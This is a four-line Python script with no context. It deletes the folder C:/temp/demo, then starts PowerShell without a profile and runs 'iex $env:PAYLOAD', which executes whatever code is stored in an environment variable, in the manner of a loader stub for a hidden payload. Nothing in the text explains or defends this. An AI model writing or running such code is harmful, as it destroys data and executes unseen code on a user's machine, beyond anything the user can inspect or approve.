import shutil
import subprocess

shutil.rmtree("C:/temp/demo")
subprocess.run(["powershell", "-nop", "-c", "iex $env:PAYLOAD"])
